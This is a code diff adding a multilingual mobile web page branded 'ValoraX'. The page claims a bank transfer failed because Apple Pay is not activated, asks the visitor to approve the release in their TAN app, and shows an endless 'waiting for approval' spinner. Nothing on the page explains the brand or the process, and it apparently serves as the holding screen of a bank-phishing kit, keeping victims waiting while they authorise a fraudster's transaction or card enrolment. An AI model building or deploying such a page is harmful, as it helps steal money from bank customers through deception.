@@ -1,0 +1,228 @@
+<!doctype html>
+<html lang="de">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>ValoraX</title>
+
+<style>
+:root{
+  --bg:#000;
+  --text:#f5f5f5;
+  --muted:rgba(255,255,255,.55);
+  --accent:#46f39a;
+  --vh:100vh;
+}
+
+*{ box-sizing:border-box; }
+
+html, body{
+  margin:0;
+  overflow:hidden;
+  overscroll-behavior:none;
+  min-height:var(--vh);
+  touch-action: manipulation;
+}
+
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:
+    -apple-system,
+    BlinkMacSystemFont,
+    "PingFang SC",
+    "Microsoft YaHei",
+    "Noto Sans SC",
+    ui-sans-serif,
+    system-ui,
+    Segoe UI,
+    Roboto,
+    Arial,
+    sans-serif;
+  display:flex;
+  justify-content:center;
+}
+
+.container{
+  width:100%;
+  max-width:560px;
+  min-height:var(--vh);
+  min-height:100dvh;
+  padding:20px 18px calc(18px + env(safe-area-inset-bottom) + 20px);
+  display:flex;
+  flex-direction:column;
+}
+
+.brand{
+  font-weight:900;
+  font-size:15px;
+  letter-spacing:.02em;
+}
+.brand span{ color:var(--accent); }
+
+.content{
+  margin-top:40px;
+  flex:1 1 auto;
+  display:flex;
+  flex-direction:column;
+}
+
+h1{
+  font-size:28px;
+  line-height:1.15;
+  margin:0 0 12px 0;
+  letter-spacing:-.02em;
+  max-width:34ch;
+  text-wrap:balance;
+}
+
+.sub{
+  margin:0;
+  color:var(--muted);
+  font-size:13px;
+  line-height:1.6;
+  max-width:54ch;
+  font-weight:600;
+}
+
+.loaderWrap{
+  margin-top:32px;
+  display:flex;
+  align-items:center;
+  gap:10px;
+}
+
+.spinner{
+  width:16px;
+  height:16px;
+  border-radius:50%;
+  border:2px solid rgba(255,255,255,.18);
+  border-top-color:rgba(255,255,255,.9);
+  animation:spin .9s linear infinite;
+}
+
+.waitText{
+  font-size:12px;
+  color:rgba(255,255,255,.7);
+  font-weight:800;
+  letter-spacing:.02em;
+}
+
+.dots{
+  display:inline-block;
+  width:1.2em;
+  overflow:hidden;
+  vertical-align:bottom;
+  animation:dots 1.2s steps(4,end) infinite;
+}
+
+@keyframes spin{ to{ transform:rotate(360deg);} }
+@keyframes dots{
+  0%{ width:0; }
+  100%{ width:1.2em; }
+}
+
+@media (max-width:380px){
+  .content{ margin-top:28px; }
+  h1{ font-size:24px; }
+}
+</style>
+</head>
+
+<body>
+<div class="container">
+  <div class="brand">Valora<span>X</span></div>
+
+  <div class="content">
+    <h1 id="title"></h1>
+    <p class="sub" id="sub"></p>
+
+    <div class="loaderWrap" role="status" aria-live="polite" aria-busy="true">
+      <div class="spinner"></div>
+      <div class="waitText" id="waitText"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+/* =======================
+   Language system
+======================= */
+const STORAGE_KEY_LANG = "valorax_lang";
+
+const LANGS = {
+  de:{
+    title:"Die Überweisung konnte nicht abgeschlossen werden, da Apple Pay derzeit nicht aktiviert ist.",
+    sub:"Bitte bestätigen Sie die Freigabe in Ihrer TAN-App, um die Überweisung fortzusetzen.",
+    wait:"Warten auf Freigabe…"
+  },
+  en:{
+    title:"The transfer could not be completed because Apple Pay is not currently activated.",
+    sub:"Please confirm the approval in your TAN app to continue the transfer.",
+    wait:"Waiting for approval…"
+  },
+  es:{
+    title:"La transferencia no pudo completarse porque Apple Pay no está activado actualmente.",
+    sub:"Confirma la autorización en tu app TAN para continuar la transferencia.",
+    wait:"Esperando autorización…"
+  },
+  fr:{
+    title:"Le virement n’a pas pu être finalisé car Apple Pay n’est pas activé actuellement.",
+    sub:"Veuillez confirmer l’autorisation dans votre application TAN pour poursuivre le virement.",
+    wait:"En attente d’autorisation…"
+  },
+  it:{
+    title:"Il bonifico non può essere completato perché Apple Pay non è attualmente attivato.",
+    sub:"Conferma l’autorizzazione nella tua app TAN per continuare il bonifico.",
+    wait:"In attesa di autorizzazione…"
+  },
+  pt:{
+    title:"A transferência não pôde ser concluída porque o Apple Pay não está ativado no momento.",
+    sub:"Confirme a autorização na sua app TAN para continuar a transferência.",
+    wait:"A aguardar autorização…"
+  },
+  nl:{
+    title:"De overboeking kon niet worden voltooid omdat Apple Pay momenteel niet is geactiveerd.",
+    sub:"Bevestig de goedkeuring in uw TAN-app om de overboeking voort te zetten.",
+    wait:"Wachten op goedkeuring…"
+  },
+  ru:{
+    title:"Перевод не может быть завершён, так как Apple Pay в настоящее время не активирован.",
+    sub:"Подтвердите операцию в TAN-приложении, чтобы продолжить перевод.",
+    wait:"Ожидание подтверждения…"
+  },
+  zhCN:{
+    title:"由于 Apple Pay 当前未启用，转账无法完成。",
+    sub:"请在 TAN 应用中确认授权以继续转账。",
+    wait:"等待授权中…"
+  }
+};
+
+let current = localStorage.getItem(STORAGE_KEY_LANG) || "de";
+if(!LANGS[current]) current = "de";
+
+function render(){
+  const L = LANGS[current];
+  document.documentElement.lang = current === "zhCN" ? "zh-CN" : current;
+  document.getElementById("title").textContent = L.title;
+  document.getElementById("sub").textContent = L.sub;
+  document.getElementById("waitText").textContent = L.wait;
+}
+render();
+
+/* viewport fix */
+function setVH(){
+  const vv = window.visualViewport;
+  const h = vv ? vv.height : window.innerHeight;
+  document.documentElement.style.setProperty("--vh", `${h}px`);
+}
+setVH();
+window.addEventListener("resize", setVH);
+if (window.visualViewport){
+  window.visualViewport.addEventListener("resize", setVH);
+  window.visualViewport.addEventListener("scroll", setVH);
+}
+</script>
+</body>
+</html>
